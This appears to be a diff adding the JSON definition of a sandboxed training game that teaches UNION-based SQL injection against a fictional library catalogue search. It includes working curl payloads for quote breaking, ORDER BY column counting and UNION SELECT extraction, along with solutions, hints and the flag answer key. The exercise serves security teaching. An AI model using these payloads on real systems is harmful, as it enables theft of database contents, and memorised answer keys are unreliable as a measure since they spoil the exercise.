@@ -1,0 +1,193 @@
+{
+  "title": "SQL Injection — UNION Data Extraction",
+  "description": "Exploit a UNION-based SQL injection in a library catalogue search to pull a hidden flag out of a table the search was never meant to reach.",
+  "prerequisites": [],
+  "outcomes": [
+    "Explain how UNION-based SQL injection differs from authentication-bypass injection.",
+    "Determine the number of columns a query returns using ORDER BY or NULL probing.",
+    "Craft a UNION SELECT payload to extract data from an unrelated database table."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 40,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, the **Athenaeum Digital Library**, runs a public book-catalogue search on its website. The developers insist the search is 'read-only, so it can't be dangerous'.\n\nRead-only is not the same as safe. If the search builds its SQL by gluing your input into the query, you can bolt on your own `UNION SELECT` and read data from tables that have nothing to do with books — including a private librarian note that holds the flag."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to your attacker machine at **10.1.33.23**, then reach the target catalogue:\n\n```\ncurl 'http://10.1.33.10/search.php?q=sea'\n```\n\nThe target server is at **10.1.33.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "The target web application is running locally:\n\n```\ncurl 'http://127.0.0.1/search.php?q=sea'\n```\n\nOr open http://127.0.0.1/search.php in a browser. Submit **start** to begin."
+    },
+    {
+      "title": "Confirm the Injection Point",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "'",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "The catalogue search takes a `q` parameter:\n\n```\ncurl 'http://10.1.33.10/search.php?q=sea'\n```\n\nAs with any injection test, the first step is to break the query syntax. Inject a single quote into the search term and watch for a database error:\n\n```\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q='\"\n```\n\nIf the page returns a SQLite error instead of book results, the search is concatenating your input directly into the SQL statement — the query string literal is now unbalanced.\n\n**What single character did you inject to trigger the database error?**",
+      "solution": "```\n$ curl -G 'http://10.1.33.10/search.php' --data-urlencode \"q='\"\n...Database error: unrecognized token: ...'...\n```\n\nThe single quote `'` breaks the `LIKE '%...%'` string literal and produces a syntax error, proving the input is not sanitised. The answer is **'**",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What breaks a SQL string?",
+          "content": "SQL string literals are wrapped in single quotes. Injecting one `'` unbalances the quotes and causes a syntax error if the input is not sanitised.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "How do I send it safely in curl?",
+          "content": "Use `curl -G ... --data-urlencode \"q='\"` so the quote is URL-encoded and reaches PHP intact.",
+          "hint_penalty": 2,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Count the Columns",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 12,
+      "answer": "2",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "To use `UNION SELECT`, your injected query must return **the same number of columns** as the original query — otherwise the database rejects it.\n\nFind the column count with `ORDER BY`. Increase the number until you get an error:\n\n```\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q=x' ORDER BY 1 -- -\"\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q=x' ORDER BY 2 -- -\"\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q=x' ORDER BY 3 -- -\"\n```\n\n`ORDER BY N` succeeds while column N exists and errors once N is too large. The largest N that does **not** error is the column count.\n\nThe catalogue shows a Title and an Author for each result — a strong hint about how many columns the query selects.\n\n**How many columns does the search query return?**",
+      "solution": "```\n$ curl -G .../search.php --data-urlencode \"q=x' ORDER BY 2 -- -\"   # OK\n$ curl -G .../search.php --data-urlencode \"q=x' ORDER BY 3 -- -\"   # Database error\n```\n\n`ORDER BY 2` works but `ORDER BY 3` errors, so the query returns **2** columns (title and author).",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What does ORDER BY N do?",
+          "content": "`ORDER BY N` sorts by the Nth column. If column N does not exist, the database throws an error. Increment N until the error appears; the last working value is the column count.",
+          "hint_penalty": 3,
+          "order": 0
+        },
+        {
+          "title": "What does the results table tell you?",
+          "content": "Each result row shows two fields: Title and Author. That maps directly to the number of columns the SELECT returns.",
+          "hint_penalty": 4,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 25,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "UNION SELECT the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 8,
+      "answer": "WMG{un10n_b4s3d_sql1_l34ks_th3_db}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You know the query returns **2 columns**. Now append a `UNION SELECT` that reads from the private `librarian_notes` table instead of `books`.\n\nThe flag is stored in the `note` column of `librarian_notes`. Your two-column UNION puts the note in the first column (rendered as a book Title) and a filler value in the second:\n\n```\ncurl -G 'http://10.1.33.10/search.php' \\\n  --data-urlencode \"q=' UNION SELECT note, 'x' FROM librarian_notes -- -\"\n```\n\nBreaking the payload down:\n* `'` closes the original `LIKE '%...` string.\n* `UNION SELECT note, 'x' FROM librarian_notes` adds a row from the secret table.\n* `-- -` comments out the trailing `%'` left over from the original query.\n\nThe flag appears in the results table where a book title would normally be.\n\n**Submit the flag pulled from `librarian_notes`.**",
+      "solution": "```\n$ curl -G 'http://10.1.33.10/search.php' \\\n    --data-urlencode \"q=' UNION SELECT note, 'x' FROM librarian_notes -- -\"\n\n...<td>WMG{un10n_b4s3d_sql1_l34ks_th3_db}</td><td>x</td>...\n```\n\nThe UNION injects the secret note into the results as a fake book title.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How many columns must UNION SELECT have?",
+          "content": "Exactly two — the same as the original query. Put the secret in one column and any filler (like `'x'`) in the other.",
+          "hint_penalty": 5,
+          "order": 0
+        },
+        {
+          "title": "Which table and column holds the flag?",
+          "content": "The flag is in the `note` column of the `librarian_notes` table: `UNION SELECT note, 'x' FROM librarian_notes`.",
+          "hint_penalty": 8,
+          "order": 1
+        },
+        {
+          "title": "Why -- - at the end?",
+          "content": "`-- ` starts a SQL comment (the trailing dash keeps it from being trimmed). It discards the leftover `%'` from the original `LIKE` clause so your injected query is syntactically valid.",
+          "hint_penalty": 10,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Please answer these questions to help us improve the game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult did you find this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Had you performed a UNION-based SQL injection before this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, I was comfortable with it", "correct": true, "order": 0 },
+            { "text": "I knew the theory but had not done it", "correct": true, "order": 1 },
+            { "text": "No, this was completely new", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How clear were the level instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",         "correct": true, "order": 0 },
+            { "text": "Mostly clear",        "correct": true, "order": 1 },
+            { "text": "Confusing at times",  "correct": true, "order": 2 },
+            { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you change or add to improve this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
